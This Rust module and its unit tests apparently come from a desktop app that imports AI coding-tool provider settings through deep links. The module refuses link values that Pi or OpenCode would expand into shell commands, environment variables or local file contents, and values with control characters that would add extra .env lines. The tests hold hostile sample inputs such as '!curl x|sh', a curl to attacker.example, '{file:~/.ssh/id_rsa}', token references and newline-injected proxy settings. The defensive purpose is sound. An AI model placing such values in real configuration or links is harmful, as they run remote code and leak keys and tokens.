//! Link values a target tool would expand at runtime (P1).
//!
//! A deep link is untrusted input, and the confirm dialog masks the API key,
//! so a value that a tool later turns into a shell command, an environment
//! variable or the contents of a local file is refused outright instead of
//! being shown for review:
//!
//! - Pi (`@earendil-works/pi-coding-agent` 1.0.0,
//!   `dist/core/resolve-config-value.js`): an `apiKey` or header value that
//!   starts with `!` is run as a shell command (l.65-69, 123-127, 172-180);
//!   `$NAME` and `${NAME}` are replaced by environment variables (l.21-64).
//!   Releases before 0.79.4 also read a plain value that names an
//!   environment variable as that variable (CHANGELOG entries for 0.77.0 and
//!   0.79.4), case-insensitively on Windows.
//! - OpenCode replaces `{env:NAME}` and `{file:path}` anywhere in its config.
//!
//! Every tool also gets single-line fields without control characters:
//! Gemini CLI's `.env` is written one `KEY=value` per line, so a line break
//! inside a value would add variables of the link's choosing.
//!
//! Only link input goes through here; values typed in the tools' own editors
//! (for example a Pi key like `!op read …`) are never checked.

use super::DeepLinkImportRequest;
use crate::app_config::AppType;
use crate::error::AppError;

/// A link field that ends up in a tool's config file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Field {
    Name,
    Endpoint,
    ApiKey,
    Model,
    HaikuModel,
    SonnetModel,
    OpusModel,
}

impl Field {
    /// Name shown to the user; the value itself is never echoed.
    fn label(self) -> &'static str {
        match self {
            Field::Name => "名称",
            Field::Endpoint => "请求地址",
            Field::ApiKey => "API Key",
            Field::Model => "模型",
            Field::HaikuModel => "Haiku 模型",
            Field::SonnetModel => "Sonnet 模型",
            Field::OpusModel => "Opus 模型",
        }
    }
}

/// Why a value was refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Expansion {
    ControlCharacter,
    ShellCommand,
    EnvReference,
    LegacyEnvName,
    FileReference,
}

/// Refuse link values the target tool would expand at runtime. Called by the
/// parser, again after a link's `config` was merged in, and when the provider
/// is built (the frontend can send a request that never went through the
/// parser).
pub(crate) fn check_link_values(
    app_type: &AppType,
    request: &DeepLinkImportRequest,
) -> Result<(), AppError> {
    let fields: [(Field, Option<&str>); 7] = [
        (Field::Name, request.name.as_deref()),
        (Field::Endpoint, request.endpoint.as_deref()),
        (Field::ApiKey, request.api_key.as_deref()),
        (Field::Model, request.model.as_deref()),
        (Field::HaikuModel, request.haiku_model.as_deref()),
        (Field::SonnetModel, request.sonnet_model.as_deref()),
        (Field::OpusModel, request.opus_model.as_deref()),
    ];
    for (field, value) in fields {
        let Some(value) = value else {
            continue;
        };
        if let Some(reason) = find_expansion(app_type, field, value) {
            return Err(rejection(app_type, field, reason));
        }
    }
    Ok(())
}

fn find_expansion(app_type: &AppType, field: Field, value: &str) -> Option<Expansion> {
    if value.chars().any(char::is_control) {
        return Some(Expansion::ControlCharacter);
    }
    match app_type {
        AppType::Pi => pi_expansion(field, value),
        AppType::OpenCode => opencode_expansion(value),
        _ => None,
    }
}

fn pi_expansion(field: Field, value: &str) -> Option<Expansion> {
    // Pi itself tests the untrimmed value; refusing leading whitespace too
    // costs nothing and survives an editor that trims on save.
    if field == Field::ApiKey && value.trim_start().starts_with('!') {
        return Some(Expansion::ShellCommand);
    }
    if contains_ascii_case_insensitive(value, "{file:") {
        return Some(Expansion::FileReference);
    }
    if has_dollar_reference(value) || contains_ascii_case_insensitive(value, "{env:") {
        return Some(Expansion::EnvReference);
    }
    if field == Field::ApiKey && names_environment_variable(value) {
        return Some(Expansion::LegacyEnvName);
    }
    None
}

fn opencode_expansion(value: &str) -> Option<Expansion> {
    if contains_ascii_case_insensitive(value, "{file:") {
        return Some(Expansion::FileReference);
    }
    if contains_ascii_case_insensitive(value, "{env:") || value.contains("${") {
        return Some(Expansion::EnvReference);
    }
    None
}

/// `$NAME` or `${…}`: a `$` followed by `{`, `_` or an ASCII letter. Pi
/// treats `$$` as an escaped `$`; refusing `$$NAME` as well is deliberate.
/// Byte-wise is safe for UTF-8: every byte compared here is ASCII, and the
/// bytes of a multi-byte character are all >= 0x80.
fn has_dollar_reference(value: &str) -> bool {
    value.as_bytes().windows(2).any(|pair| {
        pair[0] == b'$' && (pair[1] == b'{' || pair[1] == b'_' || pair[1].is_ascii_alphabetic())
    })
}

/// A plain value that older Pi releases read as an environment variable
/// name: conventional upper-case names such as `OPENAI_API_KEY`, or any
/// identifier that names a variable set for this process. `var_os` is
/// case-insensitive on Windows, like Node's `process.env` there. Real API
/// keys almost always contain `-` or lower-case letters, so they pass.
fn names_environment_variable(value: &str) -> bool {
    let value = value.trim();
    let mut chars = value.chars();
    let starts_like_a_name = chars
        .next()
        .is_some_and(|first| first == '_' || first.is_ascii_alphabetic());
    if !starts_like_a_name || !chars.all(|c| c == '_' || c.is_ascii_alphanumeric()) {
        return false;
    }
    let conventional = value.contains('_') && !value.chars().any(|c| c.is_ascii_lowercase());
    // The value is a non-empty identifier here, so it never contains `=` or
    // NUL, which `var_os` does not accept.
    conventional || std::env::var_os(value).is_some()
}

fn contains_ascii_case_insensitive(haystack: &str, needle: &str) -> bool {
    haystack.to_ascii_lowercase().contains(needle)
}

fn tool_name(app_type: &AppType) -> &'static str {
    match app_type {
        AppType::Claude => "Claude Code",
        AppType::ClaudeDesktop => "Claude Desktop",
        AppType::Codex => "Codex",
        AppType::Gemini => "Gemini CLI",
        AppType::GrokBuild => "Grok Build",
        AppType::OpenCode => "OpenCode",
        AppType::Pi => "Pi",
    }
}

fn rejection(app_type: &AppType, field: Field, reason: Expansion) -> AppError {
    let tool = tool_name(app_type);
    let label = field.label();
    let message = match reason {
        Expansion::ControlCharacter => format!(
            "链接中的“{label}”含有换行等控制字符，写入配置文件后可能变成额外的设置，不能导入。请检查链接是否完整。"
        ),
        Expansion::ShellCommand => format!(
            "链接中的“{label}”以“!”开头，{tool} 会把它当作命令在本机运行。为安全起见，不能通过链接导入；如需使用，请在 {tool} 页面手动添加线路。"
        ),
        Expansion::EnvReference => format!(
            "链接中的“{label}”含有环境变量引用，{tool} 会把它换成本机环境变量的值并随请求发出。为安全起见，不能通过链接导入；如需使用，请在 {tool} 页面手动添加线路。"
        ),
        Expansion::LegacyEnvName => format!(
            "链接中的“{label}”与环境变量名的写法相同，部分版本的 {tool} 会把它换成本机环境变量的值并随请求发出。为安全起见，不能通过链接导入；如需使用，请在 {tool} 页面手动添加线路。"
        ),
        Expansion::FileReference => format!(
            "链接中的“{label}”含有本机文件引用，{tool} 会读取该文件并随请求发出。为安全起见，不能通过链接导入；如需使用，请在 {tool} 页面手动添加线路。"
        ),
    };
    AppError::InvalidInput(message)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request(app: &str, field: Field, value: &str) -> DeepLinkImportRequest {
        let mut request = DeepLinkImportRequest {
            resource: "provider".to_string(),
            app: Some(app.to_string()),
            name: Some("Example".to_string()),
            endpoint: Some("https://api.example.com/v1".to_string()),
            api_key: Some("sk-example-123".to_string()),
            model: Some("example-model".to_string()),
            ..Default::default()
        };
        let slot = match field {
            Field::Name => &mut request.name,
            Field::Endpoint => &mut request.endpoint,
            Field::ApiKey => &mut request.api_key,
            Field::Model => &mut request.model,
            Field::HaikuModel => &mut request.haiku_model,
            Field::SonnetModel => &mut request.sonnet_model,
            Field::OpusModel => &mut request.opus_model,
        };
        *slot = Some(value.to_string());
        request
    }

    #[test]
    fn expansion_syntax_is_refused_per_tool_without_echoing_the_value() {
        for (app_type, app, field, value) in [
            (AppType::Pi, "pi", Field::ApiKey, "!curl x|sh"),
            (
                AppType::Pi,
                "pi",
                Field::ApiKey,
                "  !curl https://attacker.example",
            ),
            (AppType::Pi, "pi", Field::ApiKey, "$HOME"),
            (AppType::Pi, "pi", Field::ApiKey, "${OPENAI_API_KEY}"),
            (AppType::Pi, "pi", Field::ApiKey, "prefix-$_SECRET"),
            (AppType::Pi, "pi", Field::ApiKey, "OPENAI_API_KEY"),
            (AppType::Pi, "pi", Field::Model, "${HOME}"),
            (
                AppType::Pi,
                "pi",
                Field::Endpoint,
                "https://a.example/$HOME",
            ),
            (
                AppType::OpenCode,
                "opencode",
                Field::ApiKey,
                "{file:~/.ssh/id_rsa}",
            ),
            (
                AppType::OpenCode,
                "opencode",
                Field::ApiKey,
                "{env:AWS_SECRET}",
            ),
            (
                AppType::OpenCode,
                "opencode",
                Field::ApiKey,
                "{ENV:AWS_SECRET}",
            ),
            (
                AppType::OpenCode,
                "opencode",
                Field::Endpoint,
                "https://a.example/{env:GITHUB_TOKEN}",
            ),
            (AppType::OpenCode, "opencode", Field::Name, "${HOME}"),
            (
                AppType::Gemini,
                "gemini",
                Field::ApiKey,
                "k\nHTTPS_PROXY=http://evil",
            ),
            (
                AppType::Gemini,
                "gemini",
                Field::Model,
                "m\r\nNODE_OPTIONS=x",
            ),
            (AppType::Claude, "claude", Field::HaikuModel, "a\u{0}b"),
            (AppType::Codex, "codex", Field::Name, "tab\there"),
        ] {
            let Err(error) = check_link_values(&app_type, &request(app, field, value)) else {
                panic!("{app}/{field:?} must be refused");
            };
            let message = error.to_string();
            assert!(message.contains(field.label()), "{app}: {message}");
            assert!(!message.contains(value.trim()), "{app}: {message}");
        }
    }

    #[test]
    fn ordinary_values_and_switch_tools_are_left_alone() {
        for (app_type, app, field, value) in [
            (AppType::Pi, "pi", Field::ApiKey, "sk-abc123"),
            (AppType::Pi, "pi", Field::ApiKey, "sk-abc$1def"),
            (AppType::Pi, "pi", Field::ApiKey, "sk-ends-with-!"),
            (AppType::Pi, "pi", Field::ApiKey, "gsk_AbCdEf0123456789"),
            (AppType::Pi, "pi", Field::Model, "anthropic/claude-opus-4-8"),
            (AppType::Pi, "pi", Field::Name, "My Pi"),
            (
                AppType::OpenCode,
                "opencode",
                Field::ApiKey,
                "sk-{not-a-reference}",
            ),
            (AppType::OpenCode, "opencode", Field::ApiKey, "sk-a$b"),
            // Switch-mode tools never expand these spellings.
            (AppType::Claude, "claude", Field::ApiKey, "!literal-key"),
            (AppType::Codex, "codex", Field::ApiKey, "${literal}"),
            (AppType::Gemini, "gemini", Field::ApiKey, "{env:LITERAL}"),
            (
                AppType::GrokBuild,
                "grokbuild",
                Field::ApiKey,
                "OPENAI_API_KEY",
            ),
        ] {
            check_link_values(&app_type, &request(app, field, value))
                .unwrap_or_else(|error| panic!("{app}/{field:?}={value}: {error}"));
        }
    }

    struct EnvVarGuard(&'static str);

    impl Drop for EnvVarGuard {
        fn drop(&mut self) {
            std::env::remove_var(self.0);
        }
    }

    #[test]
    #[serial_test::serial]
    fn a_pi_key_that_names_a_set_variable_is_refused() {
        // Lower case and without `_`, so only the "variable is set" rule can
        // match it.
        const NAME: &str = "chimeralinkguardprobe";
        let pi_request = request("pi", Field::ApiKey, NAME);
        std::env::remove_var(NAME);
        check_link_values(&AppType::Pi, &pi_request).expect("unset name is an ordinary key");

        let _guard = EnvVarGuard(NAME);
        std::env::set_var(NAME, "local secret");
        let error = check_link_values(&AppType::Pi, &pi_request)
            .expect_err("a key that names a set variable is refused");
        assert!(error.to_string().contains("API Key"));
        assert!(!error.to_string().contains("local secret"));
    }
}
